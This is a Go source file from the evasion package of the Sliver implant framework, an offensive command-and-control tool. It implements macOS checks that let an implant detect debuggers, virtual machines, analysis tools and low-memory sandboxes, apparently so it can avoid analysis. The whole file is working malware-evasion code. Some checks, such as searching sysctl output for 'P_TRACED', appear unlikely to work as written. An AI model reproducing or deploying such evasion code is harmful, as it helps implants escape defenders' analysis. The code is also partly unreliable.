package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	//{{if .Config.Debug}}
	"log"
	//{{end}}
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

// DetectDebugger - Comprehensive debugger detection for macOS
// Returns true if a debugger is detected
func DetectDebugger() bool {
	//{{if .Config.Debug}}
	log.Println("Running macOS debugger detection checks...")
	//{{end}}

	// Technique 1: sysctl check for P_TRACED flag
	if checkSysctlPtraced() {
		//{{if .Config.Debug}}
		log.Println("Detected: sysctl P_TRACED flag")
		//{{end}}
		return true
	}

	// Technique 2: Check for debugger processes (lldb, Xcode)
	if detectDebuggerProcesses() {
		//{{if .Config.Debug}}
		log.Println("Detected: Debugger process found")
		//{{end}}
		return true
	}

	// Technique 3: ptrace self-attach test
	if testPtraceSelfAttach() {
		//{{if .Config.Debug}}
		log.Println("Detected: ptrace self-attach failed")
		//{{end}}
		return true
	}

	// Technique 4: Check for DYLD_INSERT_LIBRARIES
	if checkDYLDInsertLibraries() {
		//{{if .Config.Debug}}
		log.Println("Detected: DYLD_INSERT_LIBRARIES set")
		//{{end}}
		return true
	}

	//{{if .Config.Debug}}
	log.Println("No debugger detected on macOS")
	//{{end}}
	return false
}

// checkSysctlPtraced - Check if P_TRACED flag is set via sysctl
func checkSysctlPtraced() bool {
	cmd := exec.Command("sysctl", "kern.proc.pid."+fmt.Sprint(os.Getpid()))
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	// Look for P_TRACED flag in output
	return strings.Contains(string(output), "P_TRACED")
}

// detectDebuggerProcesses - Check for common macOS debuggers
func detectDebuggerProcesses() bool {
	debuggerNames := []string{
		"lldb",
		"gdb",
		"Xcode",
		"debugserver",
		"dtrace",
		"dtruss",
		"instruments",
	}

	cmd := exec.Command("ps", "aux")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	outputLower := strings.ToLower(string(output))

	for _, debugger := range debuggerNames {
		if strings.Contains(outputLower, strings.ToLower(debugger)) {
			return true
		}
	}

	return false
}

// testPtraceSelfAttach - Try to ptrace ourselves (fails if already traced)
func testPtraceSelfAttach() bool {
	// Try to attach ptrace to ourselves
	err := syscall.PtraceAttach(os.Getpid())

	if err != nil {
		if err == syscall.EPERM {
			return true
		}
	} else {
		syscall.PtraceDetach(os.Getpid())
	}

	return false
}

// checkDYLDInsertLibraries - Check for DYLD_INSERT_LIBRARIES (hook injection)
func checkDYLDInsertLibraries() bool {
	dyldInsert := os.Getenv("DYLD_INSERT_LIBRARIES")
	return dyldInsert != ""
}

// DetectVM - Comprehensive virtual machine detection for macOS
// Returns true if running in a virtual machine
func DetectVM() bool {
	//{{if .Config.Debug}}
	log.Println("Running macOS VM detection checks...")
	//{{end}}

	// Technique 1: Check system profiler for VM indicators
	if detectVMSystemProfiler() {
		//{{if .Config.Debug}}
		log.Println("Detected: VM via system_profiler")
		//{{end}}
		return true
	}

	// Technique 2: Check for VM-specific processes
	if detectVMProcesses() {
		//{{if .Config.Debug}}
		log.Println("Detected: VM via processes")
		//{{end}}
		return true
	}

	// Technique 3: Check ioreg for VM indicators
	if detectVMIOReg() {
		//{{if .Config.Debug}}
		log.Println("Detected: VM via ioreg")
		//{{end}}
		return true
	}

	//{{if .Config.Debug}}
	log.Println("No VM detected on macOS")
	//{{end}}
	return false
}

// detectVMSystemProfiler - Check system_profiler for VM indicators
func detectVMSystemProfiler() bool {
	cmd := exec.Command("system_profiler", "SPHardwareDataType")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	outputLower := strings.ToLower(string(output))
	vmIndicators := []string{
		"vmware",
		"virtualbox",
		"parallels",
		"virtual",
		"qemu",
	}

	for _, indicator := range vmIndicators {
		if strings.Contains(outputLower, indicator) {
			return true
		}
	}

	return false
}

// detectVMProcesses - Check for VM-specific processes on macOS
func detectVMProcesses() bool {
	vmProcessNames := []string{
		"vmware",
		"vmware-tools",
		"VBoxClient",
		"VBoxService",
		"parallels",
		"prl_tools",
	}

	cmd := exec.Command("ps", "aux")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	outputLower := strings.ToLower(string(output))

	for _, vmProc := range vmProcessNames {
		if strings.Contains(outputLower, strings.ToLower(vmProc)) {
			return true
		}
	}

	return false
}

// detectVMIOReg - Check ioreg for VM indicators
func detectVMIOReg() bool {
	cmd := exec.Command("ioreg", "-l")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	outputLower := strings.ToLower(string(output))
	vmIndicators := []string{
		"vmware",
		"virtualbox",
		"parallels",
		"qemu",
	}

	for _, indicator := range vmIndicators {
		if strings.Contains(outputLower, indicator) {
			return true
		}
	}

	return false
}

// DetectSandbox - Comprehensive sandbox detection for macOS
// Returns true if running in a sandbox environment
func DetectSandbox() bool {
	//{{if .Config.Debug}}
	log.Println("Running macOS sandbox detection checks...")
	//{{end}}

	// Technique 1: Check for analysis tools
	if detectAnalysisTools() {
		//{{if .Config.Debug}}
		log.Println("Detected: Analysis tools")
		//{{end}}
		return true
	}

	// Technique 2: Check system resources
	if detectLowResources() {
		//{{if .Config.Debug}}
		log.Println("Detected: Low resources")
		//{{end}}
		return true
	}

	//{{if .Config.Debug}}
	log.Println("No sandbox detected on macOS")
	//{{end}}
	return false
}

// detectAnalysisTools - Check for analysis tools on macOS
func detectAnalysisTools() bool {
	analysisTools := []string{
		"wireshark",
		"charles",
		"burp",
		"lldb",
		"gdb",
		"xcode",
		"instruments",
		"dtrace",
		"dtruss",
	}

	cmd := exec.Command("ps", "aux")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	outputLower := strings.ToLower(string(output))

	for _, tool := range analysisTools {
		if strings.Contains(outputLower, tool) {
			return true
		}
	}

	return false
}

// detectLowResources - Check for low system resources
func detectLowResources() bool {
	// Check total memory via sysctl
	cmd := exec.Command("sysctl", "-n", "hw.memsize")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	var memBytes int64
	_, err = fmt.Sscanf(strings.TrimSpace(string(output)), "%d", &memBytes)
	if err != nil {
		return false
	}

	// Less than 2GB is suspicious
	twoGB := int64(2 * 1024 * 1024 * 1024)
	return memBytes < twoGB
}
